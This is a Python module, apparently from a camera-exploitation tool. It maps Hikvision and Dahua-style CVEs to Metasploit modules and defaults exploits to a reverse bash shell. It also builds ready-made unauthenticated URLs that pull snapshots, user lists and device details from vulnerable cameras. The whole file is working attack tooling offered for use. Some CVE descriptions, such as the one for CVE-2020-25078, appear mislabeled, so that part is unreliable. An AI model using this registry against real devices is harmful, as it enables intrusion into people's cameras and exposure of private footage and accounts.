"""
Payload registry: map each CVE to Metasploit module and/or native (no-MSF) ready payloads.
Used to auto-select the right exploit and to build ready-made access URLs per vulnerability.
For exploit-type modules, reverse shell payload is applied automatically (see get_metasploit_module_for_cve).
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

# Default payload for RCE/exploit modules when no specific payload is set (reverse shell)
DEFAULT_REVERSE_SHELL_PAYLOAD = "cmd/unix/reverse_bash"

# CVE → Metasploit module + native "tiles" (ready URLs / actions)


@dataclass
class NativePayload:
    """Ready-made action without Metasploit (e.g. direct URL for snapshot)."""
    name: str
    description: str
    url_template: str  # e.g. "http://{ip}:{port}/ISAPI/System/Video/inputs/channels/1/snapshot"
    method: str = "GET"
    cve: str = ""


@dataclass
class CVEPayloadSpec:
    """Full payload spec for a CVE: Metasploit + native tiles."""
    cve: str
    description: str
    msf_module: Optional[str] = None
    msf_type: str = "exploit"  # exploit | auxiliary
    msf_payload: Optional[str] = None  # e.g. cmd/unix/reverse_bash
    native: List[NativePayload] = field(default_factory=list)


# Registry: CVE id → spec
CVE_PAYLOADS: Dict[str, CVEPayloadSpec] = {
    "CVE-2017-7921": CVEPayloadSpec(
        cve="CVE-2017-7921",
        description="Hikvision auth bypass – unauthenticated snapshot, user list, config",
        msf_module="gather/hikvision_info_disclosure_cve_2017_7921",
        msf_type="auxiliary",
        native=[
            NativePayload(
                name="Snapshot",
                description="Unauthenticated JPEG snapshot",
                url_template="http://{ip}:{port}/ISAPI/System/Video/inputs/channels/1/snapshot",
                cve="CVE-2017-7921",
            ),
            NativePayload(
                name="User list",
                description="List users (XML)",
                url_template="http://{ip}:{port}/ISAPI/Security/userCheck",
                cve="CVE-2017-7921",
            ),
        ],
    ),
    "CVE-2021-36260": CVEPayloadSpec(
        cve="CVE-2021-36260",
        description="Hikvision RCE – command injection via /SDK/webLanguage",
        msf_module="linux/http/hikvision_cve_2021_36260_blind",
        msf_type="exploit",
        msf_payload="cmd/unix/reverse_bash",
        native=[],  # No safe “native” payload; use Metasploit for shell
    ),
    "CVE-2018-9995": CVEPayloadSpec(
        cve="CVE-2018-9995",
        description="Dahua / TVT NVR auth bypass (cookie)",
        msf_module=None,  # No standard MSF exploit in main tree
        native=[
            NativePayload(
                name="Device type",
                description="Get device type without auth",
                url_template="http://{ip}:{port}/cgi-bin/magicBox.cgi?action=getDeviceType",
                cve="CVE-2018-9995",
            ),
        ],
    ),
    "CVE-2020-25078": CVEPayloadSpec(
        cve="CVE-2020-25078",
        description="Dahua RPC2 command injection (time params)",
        msf_module=None,
        native=[],
    ),
}


def get_payload_spec(cve_id: str) -> Optional[CVEPayloadSpec]:
    """Return payload spec for CVE or None."""
    return CVE_PAYLOADS.get(cve_id)


def get_native_payloads_for_cve(cve_id: str, ip: str, port: int = 80, use_ssl: bool = False) -> List[Dict[str, Any]]:
    """
    Build ready-made payload "tiles" for a CVE: list of {name, description, url}.
    Use in TUI/report so user can open snapshot/user list etc. with one click.
    """
    spec = get_payload_spec(cve_id)
    if not spec or not spec.native:
        return []
    proto = "https" if use_ssl else "http"
    out = []
    for n in spec.native:
        url = n.url_template.format(ip=ip, port=port).replace("http://", f"{proto}://", 1)
        out.append({"name": n.name, "description": n.description, "url": url, "method": n.method})
    return out


def get_metasploit_module_for_cve(cve_id: str) -> Optional[Dict[str, Any]]:
    """
    Return Metasploit module info for CVE: {module, type, payload}.
    None if no MSF module for this CVE.
    For exploit-type modules, payload defaults to reverse shell (DEFAULT_REVERSE_SHELL_PAYLOAD).
    """
    spec = get_payload_spec(cve_id)
    if not spec or not spec.msf_module:
        return None
    payload = spec.msf_payload
    if not payload and spec.msf_type == "exploit":
        payload = DEFAULT_REVERSE_SHELL_PAYLOAD
    if not payload:
        payload = DEFAULT_REVERSE_SHELL_PAYLOAD
    return {
        "module": spec.msf_module,
        "type": spec.msf_type,
        "payload": payload,
        "description": spec.description,
    }


def build_native_tiles_for_vulns(
    vulns: List[str], ip: str, port: int = 80, use_ssl: bool = False
) -> List[Dict[str, Any]]:
    """
    Given a list of CVE ids (e.g. from camera.vulns), return all native tiles
    as a single list (name, description, url, cve).
    """
    tiles: List[Dict[str, Any]] = []
    seen_urls = set()
    for cve_id in vulns or []:
        for t in get_native_payloads_for_cve(cve_id, ip, port, use_ssl):
            if t["url"] not in seen_urls:
                seen_urls.add(t["url"])
                t["cve"] = cve_id
                tiles.append(t)
    return tiles
